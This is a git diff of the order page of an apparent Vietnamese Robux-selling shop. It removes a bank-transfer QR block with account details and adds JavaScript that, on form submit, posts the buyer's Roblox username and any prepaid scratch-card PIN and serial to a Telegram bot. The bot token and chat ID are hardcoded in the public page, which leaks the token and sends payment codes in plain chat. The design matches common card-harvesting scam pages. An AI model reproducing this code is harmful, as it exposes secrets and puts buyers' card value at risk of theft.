@@ -245,91 +245,75 @@
 </div>
 
 <script>
+const TELEGRAM_TOKEN = '8965289753:AAFra30f7E8FtBFt5guHLzSGTr2fwUjIHAM';
+const TELEGRAM_CHAT_ID = '6999613477';
+
+function selectPackage(packageName) {
+    var packageSelect = document.getElementById('packageSelect');
+    if (packageSelect) packageSelect.value = packageName;
+    var orderForm = document.getElementById('orderForm');
+    if (orderForm) orderForm.scrollIntoView({ behavior: 'smooth' });
+}
+
 function togglePaymentFields() {
     var method = document.getElementById("paymentMethod").value;
     var cardBox = document.getElementById("cardFields");
     var qrBox = document.querySelector(".payment-info");
     
     if (method === "card") {
-        cardBox.style.display = "block";
+        if (cardBox) cardBox.style.display = "block";
         if (qrBox) qrBox.style.display = "none";
     } else {
-        cardBox.style.display = "none";
+        if (cardBox) cardBox.style.display = "none";
         if (qrBox) qrBox.style.display = "block";
     }
 }
-</script>
 
-                <!-- THÔNG TIN THANH TOÁN -->
-                <div class="payment-info">
-    <h4>Hướng Dẫn Thanh Toán Quét Mã QR</h4>
-    <p>Chuyển khoản theo thông tin ngân hàng bên dưới:</p>
-    <div class="qr-placeholder" style="text-align: center;">
-        <img src="https://img.vietqr.io/image/vietcombank-1050808350-compact.jpg?addTag=1&accountName=TRAN%20THE%20VY" alt="Mã QR Vietcombank" style="max-width: 220px; border-radius: 8px; margin-bottom: 10px;">
-        <p><b>Ngân hàng:</b> Vietcombank</p>
-        <p><b>Số tài khoản:</b> 1050808350</p>
-        <p><b>Chủ tài khoản:</b> TRAN THE VY</p>
-    </div>
-</div>
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('robuxForm');
+    if (!form) return;
 
-                </div>
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
 
-                <div style="margin-top: 20px;">
-                    <button type="submit" class="btn-buy" style="padding: 15px; font-size: 1.1rem;">Xác Nhận Đã Chuyển Tiền & Đặt Hàng</button>
-                </div>
-            </form>
-        </div>
-    </div>
+        const username = document.getElementById('username') ? document.getElementById('username').value : '';
+        const packageVal = document.getElementById('packageSelect') ? document.getElementById('packageSelect').value : '';
+        const paymentMethod = document.getElementById('paymentMethod') ? document.getElementById('paymentMethod').value : 'qr';
 
-    <footer>
-        <p>&copy; 2026 Shop Robux TTV. Tất cả quyền được bảo lưu.</p>
-    </footer>
+        let message = `🛒 <b>ĐƠN HÀNG MỚI TỪ WEB!</b>\n\n`;
+        message += `👤 <b>Tài khoản Roblox:</b> ${username}\n`;
+        message += `📦 <b>Gói Robux:</b> ${packageVal}\n`;
+        message += `💳 <b>Hình thức:</b> ${paymentMethod === 'card' ? 'Thẻ cào' : 'Chuyển khoản / QR'}\n`;
 
-    <!-- CODE GỬI THÔNG TIN VỀ TELEGRAM -->
-<script>
-const TELEGRAM_TOKEN = '8965289753:AAFra30f7E8FtBFt5guHLzSGTr2fwUjIHAM';
-const TELEGRAM_CHAT_ID = '6999613477';
+        if (paymentMethod === 'card') {
+            const cardType = document.getElementById('cardType') ? document.getElementById('cardType').value : '';
+            const cardPin = document.getElementById('cardPin') ? document.getElementById('cardPin').value : '';
+            const cardSeri = document.getElementById('cardSeri') ? document.getElementById('cardSeri').value : '';
 
-document.getElementById('robuxForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+            message += `📲 <b>Loại thẻ:</b> ${cardType}\n`;
+            message += `🔑 <b>Mã thẻ (PIN):</b> <code>${cardPin}</code>\n`;
+            message += `🔢 <b>Số Seri:</b> <code>${cardSeri}</code>\n`;
+        }
 
-    const username = document.getElementById('username').value;
-    const packageVal = document.getElementById('packageSelect').value;
-    const paymentMethod = document.getElementById('paymentMethod') ? document.getElementById('paymentMethod').value : 'qr';
-
-    let message = `🛒 <b>ĐƠN HÀNG MỚI TỪ WEB!</b>\n\n`;
-    message += `👤 <b>Tài khoản Roblox:</b> ${username}\n`;
-    message += `📦 <b>Gói Robux:</b> ${packageVal}\n`;
-    message += `💳 <b>Hình thức:</b> ${paymentMethod === 'card' ? 'Thẻ cào' : 'Chuyển khoản / QR'}\n`;
-
-    if (paymentMethod === 'card') {
-        const cardType = document.getElementById('cardType').value;
-        const cardPin = document.getElementById('cardPin').value;
-        const cardSeri = document.getElementById('cardSeri').value;
-
-        message += `📲 <b>Loại thẻ:</b> ${cardType}\n`;
-        message += `🔑 <b>Mã thẻ (PIN):</b> <code>${cardPin}</code>\n`;
-        message += `🔢 <b>Số Seri:</b> <code>${cardSeri}</code>\n`;
-    }
-
-    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
         })
-    })
-    .then(response => {
-        alert('Đặt hàng thành công! Vui lòng chờ xử lý.');
-        location.reload();
-    })
-    .catch(error => {
-        alert('Có lỗi xảy ra, vui lòng thử lại!');
+        .then(response => {
+            alert('Đặt hàng thành công!');
+            form.reset();
+        })
+        .catch(error => {
+            alert('Lỗi gửi đơn, vui lòng kiểm tra kết nối!');
+        });
     });
 });
 </script>
-
 </body>
 </html>
+
